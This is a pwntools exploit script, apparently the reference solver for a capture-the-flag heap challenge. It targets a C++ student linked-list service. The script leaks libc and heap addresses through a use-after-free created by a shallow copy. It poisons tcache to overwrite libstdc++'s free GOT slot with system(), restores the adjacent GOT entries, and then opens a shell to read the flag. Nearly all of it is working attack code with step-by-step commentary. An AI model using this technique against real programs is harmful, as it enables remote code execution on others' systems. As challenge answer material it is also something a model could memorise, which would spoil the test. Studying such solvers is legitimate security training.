import os

from pwn import *

context.log_level = 'info'

HOST = os.environ["SERVICE_APP_MAIN_HOST"]
PORT = int(os.environ["SERVICE_APP_MAIN_PORT"])

libc = ELF("./libc.so.6")
libcpp = ELF("./libstdc++.so.6.0.30")
# libstdc++ itself depends on libgcc_s (unwinding ABI, e.g. _Unwind_*) and libm
# (math functions): some of its PLT/GOT neighbours around "free" resolve into
# these libraries instead of libc, so they're needed too in order to restore
# those slots to a real, callable address.
libgcc_s = ELF("./libgcc_s.so.1")
libm = ELF("./libm.so.6")


def mangle(addr, store):
    return addr ^ (store >> 12)


# Build the list of (got_offset, symbol_name, st_value, st_shndx) for every
# PLT/JUMP_SLOT relocation in libstdc++, in increasing GOT-address order. Symbols
# defined inside libstdc++ itself resolve relative to libcpp's base; symbols that
# are imported from libc (like "free" itself) resolve relative to libc's base.
# Computing this dynamically (instead of hardcoding magic offsets) makes the
# exploit resilient to the exact libstdc++/libc point-release pulled at image
# build time, since both the challenge and this solver build from the same
# ubuntu:22.04 apt snapshot.
dynsym = libcpp.get_section_by_name('.dynsym')
relplt = libcpp.get_section_by_name('.rela.plt')
relocs = []
for r in relplt.iter_relocations():
    sym = dynsym.get_symbol(r['r_info_sym'])
    relocs.append((r['r_offset'], sym.name, sym['st_value'], sym['st_shndx']))
relocs.sort()

# libstdc++'s external (SHN_UNDEF) PLT imports come from libc, but also from
# libgcc_s (unwinding ABI, e.g. _Unwind_*) and libm (math functions). A handful
# of hot-path libc string/mem functions (strlen, memcpy, ...) are resolved via
# GNU IFUNC: their dynsym st_value is a *resolver* address, not the real
# implementation, so they can't be statically restored and must be avoided.
# pyelftools reports the IFUNC type as the generic 'STT_LOOS' (same numeric
# value as STT_GNU_IFUNC).
def ifunc_names_of(elf):
    dynsym = elf.get_section_by_name('.dynsym')
    return {s.name for s in dynsym.iter_symbols() if s['st_info']['type'] == 'STT_LOOS'}


ifunc_names = ifunc_names_of(libc) | ifunc_names_of(libgcc_s) | ifunc_names_of(libm)


def find_external(name):
    for lib in (libc, libgcc_s, libm):
        if name in lib.symbols:
            return lib, lib.symbols[name]
    return None, None


free_idx = [i for i, e in enumerate(relocs) if e[1] == 'free'][0]
free_reloc_off = relocs[free_idx][0]

# Find a span of 33 consecutive GOT slots (matching the 264-byte Student
# struct written by a single LinkedList Modify/Insert: 8 + 128 + 128) that
# contains "free" but no IFUNC symbol and no external symbol we can't resolve
# from libc/libgcc_s/libm (can't be statically restored), AND where the
# resulting malloc'd chunk pointer (free_got - free_pos*8) stays 16-byte
# aligned -- glibc's tcache_get() aborts ("unaligned tcache chunk detected")
# otherwise. Shared libraries always load at a page-aligned (hence
# 16-aligned) base, so this alignment only depends on the static GOT offset.
WINDOW = 33
window = None
free_pos = None
for start in range(free_idx - WINDOW + 1, free_idx + 1):
    end = start + WINDOW
    if start < 0 or end > len(relocs):
        continue
    pos = free_idx - start
    if (free_reloc_off - pos * 8) % 16 != 0:
        continue
    candidate = relocs[start:end]
    bad = False
    for _, name, _, shndx in candidate:
        if shndx != 'SHN_UNDEF':
            continue
        if name in ifunc_names or find_external(name)[0] is None:
            bad = True
            break
    if bad:
        continue
    window = candidate
    free_pos = free_idx - start
    break
assert window is not None, "couldn't find a resolvable GOT window around free"


def resolve(name, value, shndx):
    if shndx != 'SHN_UNDEF':
        return libcpp.address + value
    # lib.symbols[name] is already an absolute runtime address (it bakes in
    # lib.address internally) -- adding lib.address again would double-count it.
    _, addr = find_external(name)
    return addr


class Retry(Exception):
    pass


def attempt():
    p = remote(HOST, PORT, timeout=10)

    # Allocating 8 chunks so after freeing them 7 go to tcache and 1 goes to
    # the unsorted bin.
    for _ in range(8):
        p.sendlineafter(b">> ", b"2")
        p.sendlineafter(b">> ", b"0")
        p.sendlineafter(b">> ", b"50")
        p.sendlineafter(b">> ", b"Lazar")
        p.sendlineafter(b">> ", b"Mancic")

    # LinkedList has no custom copy-assignment operator, so "lists[1] =
    # lists[0]" performs a shallow (default) member-wise copy: both lists now
    # share the same chain of nodes. Clearing list 0 frees every node in that
    # chain (via the recursive LinkedListNode destructor) while list 1 still
    # references them, giving us a Use-After-Free on all 8 freed nodes.
    p.sendlineafter(b">> ", b"8")
    p.sendlineafter(b">> ", b"0")
    p.sendlineafter(b">> ", b"1")

    p.sendlineafter(b">> ", b"9")
    p.sendlineafter(b">> ", b"0")

    # Printing list 1 walks the still-valid "link" pointers through the freed
    # chunks and dumps their (now tcache/unsorted-bin-corrupted) "id" field as
    # an info leak: the unsorted-bin chunk leaks a libc pointer, the 7 tcache
    # chunks leak safe-linking-mangled heap pointers.
    p.sendlineafter(b">> ", b"7")
    p.sendlineafter(b">> ", b"1")

    p.recvuntil(b"Id: ")
    libc_leak = int(p.recvuntil(b", Name", True)) - 0x21ace0

    for _ in range(7):
        p.recvuntil(b"Id: ")
    heap_leak = (int(p.recvuntil(b", Name", True)) << 12) - 0x12000

    log.info(f"Libc leak: {libc_leak:#x}")
    log.info(f"Heap leak: {heap_leak:#x}")

    libc.address = libc_leak
    libcpp.address = libc_leak + 0x229000
    # The dynamic linker maps all of a process's shared libraries back-to-back
    # from one randomized base in a fixed, deterministic order given an
    # identical file set, so these gaps (measured once against the actual
    # built image) hold for every run, just like the libcpp gap above.
    libgcc_s.address = libc_leak - 0x109000
    libm.address = libc_leak - 0xe9000

    values = [resolve(name, val, shndx) for _, name, val, shndx in window]
    values[free_pos] = libc.symbols['system']  # replace "free" with system()

    payload = b"".join(p64(v) for v in values)
    id_value = values[0]                  # "id" is read via cin >> (decimal)
    name_bytes = payload[8:8 + 128][:-1]      # drop the canonical zero top byte
    surname_bytes = payload[8 + 128:][:-1]    # getline supplies it via its NUL

    # cin.getline() stops at the first 0x0a byte it sees. A pointer's low
    # bytes are effectively random, so roughly 2 out of every 3 leaked-address
    # payloads contain an embedded 0x0a somewhere that isn't the (safely
    # trimmed) canonical top zero byte, which would silently truncate the
    # write. Detect that up front and just retry with a fresh connection
    # (and thus a fresh ASLR base) instead of sending a doomed payload.
    if b"\n" in name_bytes or b"\n" in surname_bytes:
        p.close()
        raise Retry("embedded newline in GOT-restore payload")

    free_got = libcpp.got['free']
    target = free_got - free_pos * 8

    # Tcache poisoning: overwrite the UAF'd node's "id" field (its tcache fd
    # pointer) with a safe-linking-mangled pointer to just before libstdc++'s
    # "free" GOT entry.
    p.sendlineafter(b">> ", b"6")
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b">> ", str(mangle(target, heap_leak + 0x11eb0)).encode())
    p.sendlineafter(b">> ", b"Lazar")
    p.sendlineafter(b">> ", b"Mancic")

    # First allocation pops the (still legitimate) poisoned tcache node.
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b">> ", str(u64(b"/bin/sh\x00")).encode())
    p.sendlineafter(b">> ", b"Lazar")
    p.sendlineafter(b">> ", b"Mancic")

    # Second allocation returns our forged target address: overwrite "free"'s
    # GOT slot with system() while restoring every neighbouring GOT slot so
    # the rest of libstdc++ keeps working normally.
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b">> ", str(id_value).encode())
    p.sendlineafter(b">> ", name_bytes)
    p.sendlineafter(b">> ", surname_bytes)

    # Deleting the "/bin/sh" chunk calls libstdc++'s operator delete, which
    # now calls system() with the chunk's own content ("/bin/sh\0") as argv.
    p.sendlineafter(b">> ", b"4")
    p.sendlineafter(b">> ", b"2")

    p.sendline(b"cat /home/user/flag* 2>/dev/null; echo; echo SOLVE_DONE")
    out = p.recvuntil(b"SOLVE_DONE", timeout=10).decode(errors="replace")
    p.close()
    expected = os.environ.get("flag_main", "SCC{")
    if expected not in out:
        raise Retry("flag not found in output")
    return out


MAX_ATTEMPTS = 15
out = None
for i in range(1, MAX_ATTEMPTS + 1):
    try:
        log.info(f"Attempt {i}/{MAX_ATTEMPTS}")
        out = attempt()
        break
    except (Retry, EOFError, PwnlibException) as e:
        log.warning(f"Attempt {i} failed ({type(e).__name__}: {e}), retrying with a fresh connection")

if out is None:
    log.error("Exploit failed after all retries")
    exit(1)

print(out)
